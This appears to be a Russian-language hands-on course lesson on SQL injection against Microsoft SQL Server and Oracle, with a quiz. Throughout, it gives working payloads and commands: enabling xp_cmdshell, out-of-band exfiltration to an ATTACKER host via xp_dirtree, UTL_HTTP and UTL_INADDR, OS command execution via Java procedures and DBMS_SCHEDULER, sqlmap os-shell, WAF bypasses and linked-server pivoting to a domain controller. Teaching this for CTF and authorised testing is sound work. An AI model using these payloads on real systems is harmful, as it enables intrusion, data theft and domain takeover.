---
id: web-sqli-dbms-enterprise
title: "Корпоративные СУБД: MSSQL и Oracle"
category: web
parent: web-sqli-dbms
difficulty: hard
order: 2
tags: [sqli, mssql, oracle, xp_cmdshell, utl_http, oob, plsql, dbms]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Пентест внутренних сетей"
  - "Bug bounty"
estimated_minutes: 50
summary: "Модуль-навигатор по двум корпоративным СУБД: MSSQL с xp_cmdshell и linked servers и Oracle с PL/SQL, UTL_HTTP/DNS и OOB-каналами."
---

В корпоративном сегменте доминируют **Microsoft SQL Server (MSSQL)** и **Oracle**. Они ведут себя иначе, чем открытые СУБД: другой синтаксис метаданных, другая механика задержек, а главное — мощные встроенные средства, которые при ошибке конфигурации превращают инъекцию в полный RCE. Этот урок — практический разбор обеих баз: от фингерпринта до дампа и RCE.

## Фингерпринт: как отличить MSSQL и Oracle

Первое, что нужно сделать при инъекции, — понять диалект. Ошибки и особенности синтаксиса выдают базу.

| Признак | MSSQL | Oracle |
|---------|-------|--------|
| Текст ошибки | `Incorrect syntax near` | `ORA-01756`, `ORA-00933` |
| Комментарий | `--`, `/* */` | `--`, `/* */` (нет `#`) |
| Конкатенация строк | `+` или `CONCAT` | `\|\|` или `CONCAT` |
| Пауза | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message('a',5)` |
| Версия | `@@version` | `SELECT banner FROM v$version` |
| Stacked `;` | да | нет (PL/SQL) |
| Приведение к числу | `CAST(x AS int)` | `TO_NUMBER(x)` |

```bash
# проверка реакции на разные диалекты
curl -s "https://t/?id=1 AND 1=1" ; curl -s "https://t/?id=1' AND '1'='1"
curl -s "https://t/?id=1; WAITFOR DELAY '0:0:5'-- -" -o /dev/null -w '%{time_total}\n'
```

Если время выросло на 5 секунд после `WAITFOR` — это MSSQL. Если инъекция вообще не принимает `;`, а ошибки содержат `ORA-`, — Oracle.

## MSSQL: синтаксис и метаданные

MSSQL поддерживает stacked-запросы (несколько операторов через `;`) и богатую системную схему.

```sql
-- версия и текущий пользователь
SELECT @@version;
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
-- метаданные
SELECT name FROM sys.databases;
SELECT table_name FROM information_schema.tables;
SELECT column_name FROM information_schema.columns WHERE table_name='users';
-- агрегация строк
SELECT STRING_AGG(name, ',') FROM sys.tables;
```

## MSSQL: от инъекции к RCE

Четыре ключевых механизма.

**xp_cmdshell** — прямое исполнение команд ОС.

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**OPENROWSET** — чтение файлов и (при наличии прав) исполнение через `BULK`.

```sql
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;
```

**xp_dirtree / xp_fileexist** — OOB через SMB/DNS: сервер сам стучится к вам.

```sql
EXEC master..xp_dirtree '\\ATTACKER\share\a';
EXEC master..xp_dirtree '\\data.ATTACKER.oast.pro\a';
```

**Linked servers** — переход на другой сервер домена.

```sql
SELECT * FROM OPENQUERY("LINKED", 'SELECT @@version');
EXEC ('EXEC xp_cmdshell ''whoami''') AT "LINKED";
```

## Oracle: синтаксис и метаданные

Oracle не имеет `information_schema`; метаданные — в `all_*`/`user_*` представлениях, а неквотированные идентификаторы приводятся к ВЕРХНЕМУ регистру.

```sql
-- версия
SELECT banner FROM v$version;
SELECT version FROM v$instance;
-- таблицы и колонки
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
-- агрегация
SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables;
```

Пауза для time-based blind:

```sql
SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE 0 END FROM dual;
```

Error-based в Oracle часто требует функций, отдающих данные в тексте ошибки (например, `CTXSYS.DRITHSX.SN`, `UTL_INADDR.GET_HOST_ADDRESS`).

## Oracle: OOB и PL/SQL

Когда эха нет, Oracle отлично «звонит наружу» через `UTL_HTTP` и `UTL_INADDR`.

```sql
-- HTTP OOB
SELECT UTL_HTTP.REQUEST('http://ATTACKER:8000/'||(SELECT banner FROM v$version)) FROM dual;
-- DNS OOB
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.ATTACKER.oast.pro') FROM dual;
-- эксфильтрация по частям через dbms_pipe
SELECT dbms_pipe.receive_message('a',5) FROM dual;
```

RCE в Oracle достигается через Java stored procedures или `DBMS_SCHEDULER`:

```sql
-- создание Java-процедуры (нужны права)
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "Cmd" AS
  public class Cmd { public static String run(String c) throws Exception {
    return new java.util.Scanner(Runtime.getRuntime().exec(c).getInputStream()).useDelimiter("\\A").next(); } }
```

## Инструменты и команды

```bash
# sqlmap: явно указать СУБД и технику
sqlmap -r request.txt -p id --dbms=mssql --technique=BEUST --batch --dbs
sqlmap -r request.txt -p id --dbms=oracle --technique=BT --batch --os-shell
# sqlmap: OOB через DNS (свой домен)
sqlmap -r request.txt --dns-domain=ATTACKER.oast.pro --batch

# прямой доступ к MSSQL после получения кредов
impacket-mssqlclient sa:'Passw0rd'@10.0.0.5 -windows-auth
# odat: атаки на Oracle
odat all -s 10.0.0.6 -p 1521 -d XE -U system -P oracle
odat dbmslob -s 10.0.0.6 -d XE -U system -P oracle --getFile /etc/passwd
```

| Инструмент | Назначение | Ключевые флаги |
|-----------|-----------|----------------|
| sqlmap | универсальная эксплуатация | `--dbms --technique --dbs --os-shell` |
| impacket-mssqlclient | прямой доступ к MSSQL | `-windows-auth` |
| odat | атаки на Oracle | `all`, `dbmslob`, `utlhttp` |
| mssqlproxy | прокси через MSSQL | `-method` |

## Разобранный пример: MSSQL time-based → дамп → RCE

```bash
# 1. подтверждение time-based
$ curl -s -o /dev/null -w '%{time_total}\n' "https://t/?id=1; WAITFOR DELAY '0:0:5'-- -"
5.02                                     # подтверждено: MSSQL

# 2. извлечение версии побайтово через sqlmap
$ sqlmap -r request.txt -p id --dbms=mssql --technique=T --batch --banner
banner: 'Microsoft SQL Server 2019 (RTM)'

# 3. дамп пользователей
$ sqlmap -r request.txt -p id --dbms=mssql --batch -D app -T users --dump
+-------+----------------------------------+
| user  | password                         |
+-------+----------------------------------+
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
+-------+----------------------------------+

# 4. проверка xp_cmdshell и RCE
$ sqlmap -r request.txt -p id --dbms=mssql --os-shell
os-shell> whoami
nt authority\system
```

Артефакт: `nt authority\system` — полный RCE на сервере БД.

## Разобранный пример: Oracle OOB DNS

```bash
# 1. запускаем listener
$ interactsh-client -v
[+] Listening on, e.g. abc123.oast.pro

# 2. payload в параметре (UTL_INADDR уходит DNS-запросом на наш домен)
$ curl -s "https://t/?id=1' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('test.abc123.oast.pro') FROM dual-- -"

# 3. на listener видим обращение
[abc123.oast.pro] Received DNS interaction from <target-ip>
# -> инъекция подтверждена даже без эха в ответе

# 4. эксфильтруем данные через поддомены
$ curl -s "https://t/?id=1' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.abc123.oast.pro') FROM dual-- -"
[SYSTEM.abc123.oast.pro] Received DNS interaction    # user = SYSTEM
```

## Обходы и подводные камни

- **Регистр в Oracle.** `all_tables` вернёт строки; `"all_tables"` в кавычках — уже нет. Имена объектов — ВЕРХНИЙ регистр.
- **Комментарии.** В MSSQL `--` требует пробела/переноса; используйте `-- -` или `/* */`.
- **WAF на `WAITFOR`/`xp_cmdshell`.** Разбивайте: `WAITFOR/**/DELAY`, `xp_%63mdshell`, регистр, `CHAR()`.
- **Нет stacked в Oracle.** Планируйте UNION/blind/OOB, а не `;`-цепочки.
- **`xp_cmdshell` выключен.** Нужны `sysadmin` и `sp_configure`; иначе — `OPENROWSET`/CLR/agent jobs.
- **Права.** Даже при инъекции `xp_cmdshell` может требовать `sysadmin` — проверяйте `IS_SRVROLEMEMBER('sysadmin')`.

## Что делать дальше / решение

1. **Фингерпринт** — определите диалект по ошибкам и реакции на паузу.
2. **Разведка метаданных** — `sys.databases`/`all_tables`, получите список баз и таблиц.
3. **Дамп** — `sqlmap --dbms=<...>` или ручные UNION/blind-запросы.
4. **RCE** — MSSQL: `xp_cmdshell`/`OPENROWSET`; Oracle: Java procs/`DBMS_SCHEDULER`.
5. **OOB при отсутствии эха** — `xp_dirtree`/`UTL_HTTP`/`UTL_INADDR` на свой listener.
6. **Pivot** — linked servers (MSSQL) и внутренние БД как шаг к домену.

## Справочные таблицы

| Задача | MSSQL | Oracle |
|--------|-------|--------|
| Версия | `@@version` | `SELECT banner FROM v$version` |
| Текущий пользователь | `SYSTEM_USER` | `SELECT user FROM dual` |
| Таблицы | `information_schema.tables` | `all_tables` |
| Колонки | `information_schema.columns` | `all_tab_columns` |
| Строки в одну | `STRING_AGG` | `LISTAGG` |
| Пауза | `WAITFOR DELAY` | `dbms_pipe.receive_message` |
| OOB | `xp_dirtree` | `UTL_HTTP`/`UTL_INADDR` |
| RCE | `xp_cmdshell` | Java stored proc |

## Слепая эксфильтрация по битам

Когда ни ошибки, ни эха, ни OOB — данные достают побитово через булевы условия или задержки. Для MSSQL удобно сравнивать ASCII-код символа:

```sql
-- true, если первый символ имени базы имеет код > 100
AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)) > 100
-- побитовое сужение (binary search) — 7 запросов на символ
AND ASCII(SUBSTRING((SELECT name FROM sys.databases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY),1,1)) & 64 = 64
```

Для Oracle эквивалент использует `SUBSTR`, `ASCII` и `ROWNUM`:

```sql
AND ASCII(SUBSTR((SELECT table_name FROM all_tables WHERE ROWNUM=1),1,1)) > 100
```

Каждое сравнение даёт один бит. Бинарный поиск сокращает число запросов с 128 до 7 на символ. Именно так sqlmap и работает в режиме `--technique=B`; ручной режим нужен, когда автоматика ломается на нестандартном фильтре.

## Сравнение с открытыми СУБД

| Возможность | MySQL | PostgreSQL | MSSQL | Oracle |
|-------------|-------|-----------|-------|--------|
| Комментарий | `#`, `-- `, `/**/` | `--`, `/**/` | `--`, `/**/` | `--`, `/**/` |
| Stacked `;` | только в некоторых API | да | да | нет |
| Пауза | `SLEEP(n)` | `pg_sleep(n)` | `WAITFOR DELAY` | `dbms_pipe` |
| Чтение файла | `LOAD_FILE` | `pg_read_file` | `OPENROWSET` | `UTL_FILE` |
| RCE | `INTO OUTFILE`+UDF | `COPY TO PROGRAM` | `xp_cmdshell` | Java procs |
| Метаданные | `information_schema` | `information_schema` | `information_schema`/`sys` | `all_*` |

Знание этой таблицы экономит время: не тащите `SLEEP` в MSSQL и `information_schema` в Oracle.

## Расширенный разбор: linked servers как pivot

MSSQL часто связан с другими серверами домена (linked servers). Через них можно исполнять запросы на удалённом хосте и поднимать права.

```sql
-- список связанных серверов
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
-- выполнить на удалённом сервере
SELECT * FROM OPENQUERY("DC01", 'SELECT @@version');
EXEC ('EXEC xp_cmdshell ''whoami''') AT "DC01";
-- включить RPC out и выполнить
EXEC sp_serveroption 'DC01','rpc out','true';
```

Это типичный шаг в пентесте внутренней сети: инъекция в веб-приложении → MSSQL → linked server → контроллер домена. Всегда проверяйте `sys.servers`, прежде чем считать, что упёрлись в тупик.

## Oracle: эксплуатация через DBMS_SCHEDULER

Если Java недоступна, Oracle может выполнять команды через планировщик.

```sql
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name => 'x', job_type => 'EXECUTABLE',
    job_action => '/bin/sh', number_of_arguments => 2,
    enabled => FALSE);
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('x',1,'-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('x',2,'id > /tmp/o 2>&1');
  DBMS_SCHEDULER.ENABLE('x');
END;
/
```

Требуются привилегии `CREATE EXTERNAL JOB` — проверяйте `SELECT * FROM session_privs`.

## Чек-лист по корпоративным СУБД

- [ ] Диалект определён (ошибки, пауза, stacked).
- [ ] Версия и текущий пользователь извлечены.
- [ ] Метаданные (базы/таблицы/колонки) получены.
- [ ] Дамп чувствительных таблиц сделан.
- [ ] Проверены RCE-механизмы (`xp_cmdshell`, Java/DBMS_SCHEDULER).
- [ ] Проверены OOB-каналы (`xp_dirtree`, `UTL_HTTP`).
- [ ] Проверены linked servers / переходы на другие хосты.
- [ ] Каждый шаг зафиксирован командой и результатом.

## Квиз

```quiz
- question: "Как организовать задержку (time-based blind) в MSSQL?"
  options:
    - "SLEEP(5)"
    - "pg_sleep(5)"
    - "WAITFOR DELAY '0:0:5'"
    - "dbms_pipe.receive_message('a',5)"
  answer: 2
  explanation: "В MSSQL пауза делается через WAITFOR DELAY; dbms_pipe — это Oracle."
- question: "Где в Oracle хранится список таблиц и колонок?"
  options:
    - "sqlite_master"
    - "all_tables и all_tab_columns"
    - "pg_catalog"
    - "sys.objects"
  answer: 1
  explanation: "В Oracle привычного information_schema нет — метаданные в all_tables/all_tab_columns."
- question: "Чем Oracle может утечь данные, когда в ответе нет эха (out-of-band)?"
  options:
    - "Через UTL_HTTP/UTL_INADDR, отправив запрос или DNS-имя на ваш listener"
    - "Через INTO OUTFILE"
    - "Через xp_dirtree"
    - "Через ATTACH DATABASE"
  answer: 0
  explanation: "UTL_HTTP/UTL_INADDR дают OOB-канал; xp_dirtree — MSSQL, INTO OUTFILE — MySQL, ATTACH — SQLite."
```

## Где пригодится

- **CTF (Web):** задачи на MSSQL/Oracle встречаются реже, но дают максимум очков за RCE и OOB.
- **Пентест внутренних сетей:** MSSQL с `xp_cmdshell` и linked servers — типичный шаг к хосту и домену.
- **Bug bounty:** корпоративные порталы часто на Oracle/MSSQL; правильный диалект превращает «ошибку» в критичный отчёт.
- **Работа (AppSec/IR):** понимание, где включён опасный функционал (`xp_cmdshell`, Java procs), критично при hardening.
